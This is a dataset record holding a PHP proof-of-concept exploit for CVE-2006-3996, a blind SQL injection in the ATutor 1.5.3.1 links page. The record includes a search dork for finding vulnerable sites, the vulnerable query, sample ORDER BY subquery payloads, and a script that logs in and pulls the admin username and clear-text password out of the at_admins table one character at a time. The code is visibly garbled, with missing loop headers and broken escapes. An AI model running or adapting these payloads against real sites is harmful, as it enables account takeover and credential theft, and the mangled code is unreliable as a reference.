{
    "text": "vul_name : ATutor <= 1.5.3.1 'links' blind SQL injection / admin credentials disclosure ， vul_cve : CVE-2006-3996 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"ATutor <= 1.5.3.1 'links' blind SQL injection / admin credentials disclosuren\" ;  ， echo \"by rgod rgod ( at ) autistici ( dot ) org [ email concealed ] n\" ;  ， echo \"site :  ， echo \"dork , version specific : \"Web site engine's code is copyright\" \"2001-2006 ATutor\" \"About ATutor\"nn\" ;  ， - works regardless of php.ini settings ， - with Mysql >= 4.1 ( allowing SELECT subqueries for ORDER BY statements )  ， see ， - with at least 2 links in at_links table ， echo \"Usage : php \". $ argv [ 0 ] .\" host path user pass OPTIONSrn\" ;  ， echo \"host : target server ( ip/hostname ) rn\" ;  ， echo \"path : path to ATutorrn\" ;  ， echo \"user/pass : you need a valid simple user accountrn\" ;  ， echo \"Options : rn\" ;  ， echo \" -T [ prefix ] specify a table prefix different from default ( at_ ) rn\" ;  ， echo \" -p [ port ]  : specify a port other than 80rn\" ;  ， echo \" -P [ ip : port ]  : specify a proxyrn\" ;  ， echo \"Example : rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /atutor/ username passwordrn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /atutor/ username password -Tatutor_rn\" ;  ， die ;  ， } ， software site :  ， vulnerable code in /links/index.php at lines 92-100 ， . ， /get links ，  $ groups = implode ( ' , ' ,  $ _SESSION [ 'groups' ]  )  ;  ，  $ sql = \"SELECT * FROM \".TABLE_PREFIX.\"links L INNER JOIN \".TABLE_PREFIX.\"links_categories C USING ( cat_id ) WHERE ( owner_id= $ _SESSION [ course_id ] AND owner_type=\".LINK_CAT_COURSE.\" ) OR ( owner_id IN (  $ groups ) AND owner_type=\".LINK_CAT_GROUP.\" ) AND L.Approved=1 AND $ search AND $ cat_sql ORDER BY $ col $ order\" ;  ， } else { ，  $ sql = \"SELECT * FROM \".TABLE_PREFIX.\"links L INNER JOIN \".TABLE_PREFIX.\"links_categories C USING ( cat_id ) WHERE ( owner_id= $ _SESSION [ course_id ] AND owner_type=\".LINK_CAT_COURSE.\" ) AND L.Approved=1 AND $ search AND $ cat_sql ORDER BY $ col $ order\" ;  ， } ，  $ result = mysql_query (  $ sql ,  $ db )  ;  ， . ， with MySQL >= 4.1 you can inject a subquery after the ORDER BY statement , ex :  ， SUBSTRING ( password , 1 , 1 ) =101 )  , LinkName , Description ) FROM%20at_admins ) %20 ， DESC%20LIMIT%202/ *  ， UBSTRING ( login , 1 , 1 ) =102 )  , LinkName , Description ) FROM%20at_admins ) %20DESC ， %20LIMIT%202/ *  ， query becomes like this :  ， SELECT * FROM AT_links L INNER JOIN AT_links_categories C USING ( cat_id ) WHERE ( owner_id=1 AND owner_type=1 ) AND L.Approved=1 AND 1 AND 1 ORDER BY ( SELECT ( IF ( ASCII ( SUBSTRING ( login , 1 , 1 ) =101 )  , LinkName , Description ) FROM at_admins ) DESC LIMIT 2/ * desc ， so you can ask true/false questions to the database about the admin username/clear text password ， you will see results in the way links are ordered at screen ， You need at least two rows in at_links table ， Other queries may be vulnerable to this kind of injection , since ORDER BY statements ， are not checked at all. ， This may hide undisclosed vulnerabilities in a lot of apps , I suppose. ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"rn\" ;  $ exa.=\"rn\" ; } ， } ， } ，  $ proxy_regex = ' ( bd{1 , 3}.d{1 , 3}.d{1 , 3}.d{1 , 3} : d{1 , 5}b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.rn\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"rn\". $ html ;  ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ port=80 ;  ，  $ user= $ argv [ 3 ]  ;  ，  $ pass= $ argv [ 4 ]  ;  ，  $ prefix=\"at_\" ;  ，  $ proxy=\" ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ prefix=str_replace ( \"-T\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， } ，  $ packet =\"GET \". $ p.\"login.php HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"Set-Cookie : \" ,  $ html )  ;  ，  $ cookie=\" ;  ， { ，  $ temp2=explode ( \" \" ,  $ temp [  $ i ]  )  ;  ，  $ cookie.=\" \". $ temp2 [ 0 ]  ;  ， } ，  $ temp=explode ( \"password.value + \" ,  $ html )  ;  ，  $ temp2=explode ( \" ,  $ temp [ 1 ]  )  ;  ，  $ what= $ temp2 [ 0 ]  ;  ， echo \"salt -> \". $ what.\"rn\" ;  ，  $ data =\"form_login_action=true\" ;  ，  $ data.=\"&form_course_id=0\" ;  ，  $ data.=\"&form_password_hidden=\".sha1 (  $ pass. $ what )  ;  ，  $ data.=\"&form_login=\". $ user ;  ，  $ data.=\"&form_password=\" ;  ，  $ data.=\"&submit=Login\" ;  ，  $ packet =\"POST \". $ p.\"login.php HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Accept : text/plainrn\" ;  ，  $ packet.=\"Connection : Closern\" ;  ，  $ packet.=\"Content-Type : application/x-www-form-urlencodedrn\" ;  ，  $ packet.=\"Cookie : \". $ cookie.\"rn\" ;  ，  $ packet.=\"Content-Length : \".strlen (  $ data ) .\"rnrn\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"Set-Cookie : \" ,  $ html )  ;  ，  $ cookie=\" ;  ， { ，  $ temp2=explode ( \" \" ,  $ temp [  $ i ]  )  ;  ，  $ cookie.=\" \". $ temp2 [ 0 ]  ;  ， } ，  $ packet =\"GET \". $ p.\"bounce.php?course=1 HTTP/1.0rn\" ; /it seems you have to browse some page before to go to links panel ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Cookie : \". $ cookie.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"Set-Cookie : \" ,  $ html )  ;  ，  $ cookie=\" ;  ， { ，  $ temp2=explode ( \" \" ,  $ temp [  $ i ]  )  ;  ，  $ cookie.=\" \". $ temp2 [ 0 ]  ;  ， } ， echo \"cookie -> \". $ cookie.\"rn\" ;  ，  $ j=1 ;  ，  $ my_password=\" ;  ， { ， { ，  $ sql=\" ( SELECT ( IF ( ASCII ( SUBSTRING ( password ,  $ j , 1 ) =\". $ i.\" )  , LinkName , Descr ， iption ) FROM/\". $ prefix.\"admins ) /DESC/LIMIT/2/ * \" ;  ， echo \"sql -> \". $ sql.\"rn\" ;  ，  $ sql=urlencode (  $ sql )  ;  ，  $ packet =\"GET \". $ p.\"links/index.php?desc= $ sql HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Cookie : \". $ cookie.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"<tr onmousedown=\"document.form [ '\" ,  $ html )  ;  ，  $ temp2=explode ( \"' ] \" ,  $ temp [ 1 ]  )  ;  ，  $ my_check= $ temp2 [ 0 ]  ;  ， echo \"check -> \". $ my_check.\"rn\" ;  ， elseif (  $ my_check=\"m2\" ) {continue ; } ， elseif (  $ my_check=\" ) {die ( \"Exploit failed , maybe wrong table prefix or simply failed to login.\" )  ; } ， } ，  $ j+ ;  ， } ，  $ j=1 ;  ，  $ my_admin=\" ;  ， { ， { ，  $ sql=\" ( SELECT ( IF ( ASCII ( SUBSTRING ( login ,  $ j , 1 ) =\". $ i.\" )  , LinkName , Descript ， ion ) FROM/\". $ prefix.\"admins ) /DESC/LIMIT/2/ * \" ;  ， echo \"sql -> \". $ sql.\"rn\" ;  ，  $ sql=urlencode (  $ sql )  ;  ，  $ packet =\"GET \". $ p.\"links/index.php?desc= $ sql HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Cookie : \". $ cookie.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"<tr onmousedown=\"document.form [ '\" ,  $ html )  ;  ，  $ temp2=explode ( \"' ] \" ,  $ temp [ 1 ]  )  ;  ，  $ my_check= $ temp2 [ 0 ]  ;  ， echo \"check -> \". $ my_check.\"rn\" ;  ， elseif (  $ my_check=\"m2\" ) {continue ; } ， } ，  $ j+ ;  ， } ， echo \"-n\" ;  ， echo \"admin -> \". $ my_admin.\"n\" ;  ， echo \"password ( clear text ) -> \". $ my_password.\"n\" ;  ， echo \"-n\" ;  ， ?> ， original url : ",
    "time": "2006.08.08"
}